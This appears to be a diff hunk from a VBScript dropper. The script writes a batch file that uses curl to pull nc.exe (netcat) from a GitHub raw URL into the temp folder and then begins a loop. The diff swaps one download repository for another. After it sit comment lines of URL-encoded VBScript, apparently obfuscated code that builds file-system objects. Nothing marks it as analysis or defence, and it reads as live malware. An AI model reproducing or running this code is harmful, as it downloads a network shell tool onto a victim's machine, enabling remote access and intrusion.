@@ -43,7 +43,7 @@ Do
    If Not objFSO.FileExists(batFilePath) Then
         Set objFile = objFSO.CreateTextFile(batFilePath, True)
         objFile.WriteLine "@echo off"
-        objFile.WriteLine "curl https://raw.githubusercontent.com/omarsamyX0/shell4/main/nc.exe -o %temp%\nc.exe"
+        objFile.WriteLine "curl https://raw.githubusercontent.com/0x2034/shell5/main/nc.exe -o %temp%\nc.exe"
         objFile.WriteLine ":loop"
 ' %44%69%6d%20%74%65%6d%70%0a%74%65%6d%70%20%3d%20%22%25%74%65%6d%70%25%22%20%0a%44%69%6d%20%66%73%6f%0a%53%65%74%20
 ' %66%73%6f%20%3d%20%43%72%65%61%74%65%4f%62%6a%65%63%74%28%22%53%63%72%69%70%74%69%6e%67%2e%46%69%6c%65%53%79%73%74%65%6d%4f
